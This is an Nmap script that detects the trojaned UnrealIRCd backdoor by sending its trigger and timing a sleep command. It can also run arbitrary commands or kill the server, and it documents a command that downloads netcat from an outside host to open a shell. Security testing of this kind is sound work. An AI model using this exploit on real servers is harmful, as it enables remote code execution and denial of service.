local comm = require "comm"
local nmap = require "nmap"
local os = require "os"
local irc = require "irc"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Checks if an IRC server is backdoored by running a time-based command (ping)
and checking how long it takes to respond.

The <code>irc-unrealircd-backdoor.command</code> script argument can be used to
run an arbitrary command on the remote system. Because of the nature of
this vulnerability (the output is never returned) we have no way of
getting the output of the command. It can, however, be used to start a
netcat listener as demonstrated here:
<code>
  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
  $ ncat -vv localhost 4444
  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
  Ncat: Connected to 127.0.0.1:4444.
  pwd
  /home/ron/downloads/Unreal3.2-bad
  whoami
  ron
</code>

Metasploit can also be used to exploit this vulnerability.

In addition to running arbitrary commands, the
<code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which
simply kills the UnrealIRCd process.


Reference:
* http://seclists.org/fulldisclosure/2010/Jun/277
* http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
* http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor
]]

---
-- @args irc-unrealircd-backdoor.command An arbitrary command to run on the
--       remote system (note, however, that you won't see the output of your
--       command). This will always be attempted, even if the host isn't
--       vulnerable.  The pattern <code>%IP%</code> will be replaced with the
--       ip address of the target host.
-- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or
--       <code>true</code>, kill the backdoored UnrealIRCd running.
-- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the
--       check. This is recommended to set for more reliable check (100 is good
--       value).
--
-- @output
-- PORT     STATE SERVICE
-- 6667/tcp open  irc
-- |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
--

author = {"Vlatko Kosturjak", "Ron Bowes"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "malware", "vuln"}


portrule = irc.portrule


action = function(host, port)
  local socket = nmap.new_socket()
  local code, message
  local status, err
  local data
  -- Wait up to this long for the server to send its startup messages and
  -- a response to our noop_command. After this, send the full_command.
  -- Usually we don't have to wait the full time because we can detect
  -- the response to noop_command.
  local banner_timeout = 60
  -- Send a command to sleep this long. This just has to be long enough
  -- to remove confusion from network delay.
  local delay = 8

  -- If the command takes (delay - delay_fudge) or more seconds, the server is vulnerable.
  -- I defined the fudge as 1 second, for now, just because of rounding issues. In practice,
  -- the actual delay should never be shorter than the given delay, only longer.
  local delay_fudge = 1

  -- We send this command on connection because comm.tryssl needs to send
  -- something; it also allows us to detect the end of server
  -- initialization.
  local noop_command = "TIME"

  -- The 'AB' sequence triggers the backdoor to run a command.
  local trigger = "AB"

  -- We define a highly unique variable as a type of 'ping' -- it lets us see when our
  -- command returns. Typically, asynchronous data will be received after the initial
  -- connection -- this lets us ignore that extra data.
  local unique = "SOMETHINGUNIQUE"

  -- On Linux, do a simple sleep command.
  local command_linux = "sleep " .. delay

  -- Set up an extra command, if the user requested one
  local command_extra = ""
  if(stdnse.get_script_args('irc-unrealircd-backdoor.command')) then
    command_extra = stdnse.get_script_args('irc-unrealircd-backdoor.command')
    -- Replace "%IP%" with the ip address
    command_extra = string.gsub(command_extra, '%%IP%%', host.ip)
  end

  -- Windows, unfortunately, doesn't have a sleep command. Instead, we use 'ping' to
  -- simulate a sleep (thanks to Ed Skoudis for teaching me this one!). We always want
  -- to add 1 to the delay because the first ping happens instantly.
  --
  -- This is likely unnecessary, because the Windows version of UnrealIRCd is reportedly
  -- not vulnerable. However, it's possible that some odd person may have compiled it
  -- from the vulnerable sourcecode, so we check for it anyways.
  local command_windows = "ping -n " .. (delay + 1) .. " 127.0.0.1"

  -- Put together the full command
  local full_command = string.format("%s;%s;%s;%s;%s", trigger, unique, command_linux, command_windows, command_extra)

  -- wait time: get rid of fast reconnecting annoyance
  if(stdnse.get_script_args('irc-unrealircd-backdoor.wait')) then
    local waittime = stdnse.get_script_args('irc-unrealircd-backdoor.wait')
    stdnse.debug1("waiting for %i seconds", waittime)
    stdnse.sleep(waittime)
  end

  -- Send an innocuous command as fodder for tryssl.
  stdnse.debug1("Sending command: %s", noop_command);
  local socket, response = comm.tryssl(host, port, noop_command .. "\n", {recv_before=false})

  -- Make sure the socket worked
  if(not(socket) or not(response)) then
    stdnse.debug1("Couldn't connect to remote host")
    return nil
  end

  socket:set_timeout(banner_timeout * 1000)

  -- Look for the end of initial server messages. This allows reverse DNS
  -- resolution and ident lookups to time out and not interfere with our
  -- timing measurement.
  status = true
  data = response
  while status and not (string.find(data, noop_command) or string.find(data, " 451 ")) do
    status, response = socket:receive_bytes(0)
    if status then
      data = data .. response
    end
  end

  if not status then
    stdnse.debug1("Receive failed after %s: %s", noop_command, response)
    return nil
  end

  -- Send the backdoor command.
  stdnse.debug1("Sending command: %s", full_command);
  status, err = socket:send(full_command .. "\n")
  if not status then
    stdnse.debug1("Send failed: %s", err)
    return nil
  end

  -- Get the current time so we can measure the delay
  local time = os.time(os.date('*t'))
  socket:set_timeout((delay + 5) * 1000)

  -- Accumulate the response in the 'data' string
  status = true
  data = ""
  while not string.find(data, unique) do
    status, response = socket:receive_bytes(0)
    if status then
      data = data .. response
    else
      -- If the server unexpectedly closes the connection, it
      -- is usually related to throttling. Therefore, we
      -- print a throttling warning.
      stdnse.debug1("Receive failed: %s", response)
      socket:close()
      return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
    end
  end

  -- Determine the elapsed time
  local elapsed = os.time(os.date('*t')) - time

  -- Let the user know that everything's working
  stdnse.debug1("Received a response to our command in " .. elapsed .. " seconds")

  -- Determine whether or not the vulnerability is present
  if(elapsed > (delay - delay_fudge)) then
    -- Check if the user wants to kill the server.
    if(stdnse.get_script_args('irc-unrealircd-backdoor.kill')) then
      stdnse.debug1("Attempting to kill the Trojanned UnrealIRCd server...")

      local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
      local windows_kill = 'wmic process where "name like \'%ircd%\'" delete'
      local kill_command = string.format("%s||%s||%s", trigger, linux_kill, windows_kill)

      -- Kill the process
      stdnse.debug1("Running kill command: %s", kill_command)
      socket:send(kill_command .. "\n")
    end

    stdnse.debug1("Looks like the Trojanned unrealircd is running!")

    -- Close the socket
    socket:close()

    return "Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"
  end

  -- Close the socket
  socket:close()

  stdnse.debug1("The Trojanned version of unrealircd probably isn't running.")

  return nil
end

